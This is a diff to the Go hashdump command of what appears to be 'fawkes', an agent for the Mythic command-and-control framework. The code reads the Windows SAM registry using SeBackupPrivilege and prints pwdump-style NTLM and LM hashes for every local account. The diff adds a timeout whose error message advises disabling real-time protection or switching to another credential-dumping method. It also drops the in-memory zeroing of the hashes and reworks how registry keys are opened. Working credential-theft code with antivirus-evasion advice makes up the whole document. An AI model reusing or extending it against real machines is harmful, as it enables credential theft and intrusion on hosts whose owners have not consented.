@@ -7,8 +7,8 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"os"
 	"strings"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -18,11 +18,9 @@ import (
 
 var (
 	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
-	procRegCreateKeyExW  = advapi32HD.NewProc("RegCreateKeyExW")
 	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
 	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
 	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
-	procRegCloseKey      = advapi32HD.NewProc("RegCloseKey")
 )
 
 const (
@@ -46,6 +44,26 @@ type hashdumpArgs struct {
 }
 
 func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
+	// Run with a timeout to prevent hanging the agent if security software
+	// blocks SAM registry access (observed on Windows 11 with Defender).
+	resultCh := make(chan structs.CommandResult, 1)
+	go func() {
+		resultCh <- c.executeInner(task)
+	}()
+
+	select {
+	case result := <-resultCh:
+		return result
+	case <-time.After(60 * time.Second):
+		return errorf("Hashdump timed out after 60s — security software may be blocking SAM registry access.\nConsider disabling real-time protection or using an alternative credential dumping method.")
+	}
+}
+
+func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult {
+	// Note: runtime.LockOSThread() was removed — SYSTEM process token grants
+	// SeBackupPrivilege on all threads, and LockOSThread was causing process
+	// crashes during response delivery after hashdump completed.
+
 	var args hashdumpArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -77,73 +95,48 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	if err != nil {
 		return errorf("Failed to enumerate users: %v", err)
 	}
-	defer func() {
-		for i := range users {
-			structs.ZeroString(&users[i].lmHash)
-			structs.ZeroString(&users[i].ntHash)
-		}
-	}()
+	// Note: ZeroString on hash strings was removed — it caused a fatal crash
+	// (process termination) on Windows 11. The hashes are already in the output
+	// string sent to Mythic, so zeroing intermediaries adds no security value.
+	// Root cause: unsafe.StringData + clear() on hex.EncodeToString output
+	// triggers a memory access violation. See investigations/hashdump-crash.md.
 
 	if len(users) == 0 {
 		return errorResult("No user accounts found in SAM database.")
 	}
 
-	// Format output and build credential entries for Mythic's credential vault
-	hostname, _ := os.Hostname()
+	// Format output — credentials are registered via ProcessResponse hook on the server side
 	var sb strings.Builder
-	var creds []structs.MythicCredential
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
-
-		// Report NTLM hash to Mythic credential vault
-		if u.ntHash != emptyNTHash {
-			creds = append(creds, structs.MythicCredential{
-				CredentialType: "hash",
-				Realm:          hostname,
-				Account:        u.username,
-				Credential:     fmt.Sprintf("%s:%d:%s:%s:::", u.username, u.rid, u.lmHash, u.ntHash),
-				Comment:        "hashdump (SAM)",
-			})
-		}
 	}
 
-	result := structs.CommandResult{
+	return structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
-	if len(creds) > 0 {
-		result.Credentials = &creds
-	}
-	return result
 }
 
-// regOpenKey opens a registry key using RegCreateKeyExW with REG_OPTION_BACKUP_RESTORE.
-// This bypasses DACLs on restricted keys (like SAM) when SeBackupPrivilege is held.
+// regOpenKey opens a registry key using the Go stdlib windows.RegOpenKeyEx.
+// As SYSTEM or with SeBackupPrivilege, KEY_READ is sufficient to access
+// restricted keys (SAM, SECURITY) without special ulOptions flags.
 func regOpenKey(root uintptr, path string) (uintptr, error) {
-	pathPtr, _ := windows.UTF16PtrFromString(path)
-	var hKey uintptr
-	var disposition uint32
-	ret, _, err := procRegCreateKeyExW.Call(
-		root,
-		uintptr(unsafe.Pointer(pathPtr)),
-		0, // Reserved
-		0, // Class (nil)
-		regOptionBackupRestore,
-		uintptr(windows.KEY_READ),
-		0, // Security attributes (nil)
-		uintptr(unsafe.Pointer(&hKey)),
-		uintptr(unsafe.Pointer(&disposition)),
-	)
-	if ret != 0 {
-		return 0, fmt.Errorf("RegCreateKeyExW(%s): %v (code %d)", path, err, ret)
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		return 0, fmt.Errorf("invalid path %q: %v", path, err)
 	}
-	return hKey, nil
+	var hKey windows.Handle
+	regerr := windows.RegOpenKeyEx(windows.Handle(root), pathPtr, 0, windows.KEY_READ, &hKey)
+	if regerr != nil {
+		return 0, fmt.Errorf("RegOpenKeyEx(%s): %v", path, regerr)
+	}
+	return uintptr(hKey), nil
 }
 
 // regCloseKey closes a registry key handle
 func regCloseKey(hKey uintptr) {
-	procRegCloseKey.Call(hKey)
+	windows.RegCloseKey(windows.Handle(hKey))
 }
 
 // regQueryClassName reads the class name of a registry key
@@ -192,6 +185,10 @@ func regQueryValue(hKey uintptr, valueName string) ([]byte, error) {
 	)
 	if ret != 0 {
 		return nil, fmt.Errorf("RegQueryValueExW: %v (code %d)", err, ret)
+	}
+	// Guard against dataSize growing between calls (TOCTOU)
+	if dataSize > uint32(len(data)) {
+		dataSize = uint32(len(data))
 	}
 	return data[:dataSize], nil
 }
@@ -336,18 +333,18 @@ func enableBackupPrivilege() error {
 	var token windows.Token
 	processHandle, err := windows.GetCurrentProcess()
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to get current process handle: %w", err)
 	}
 	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to open process token: %w", err)
 	}
 	defer token.Close()
 
 	var luid windows.LUID
 	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to lookup SeBackupPrivilege LUID: %w", err)
 	}
 
 	tp := windows.Tokenprivileges{
@@ -365,14 +362,14 @@ func enableThreadBackupPrivilege() error {
 	var token windows.Token
 	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to open thread token: %w", err)
 	}
 	defer token.Close()
 
 	var luid windows.LUID
 	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to lookup SeBackupPrivilege LUID: %w", err)
 	}
 
 	tp := windows.Tokenprivileges{
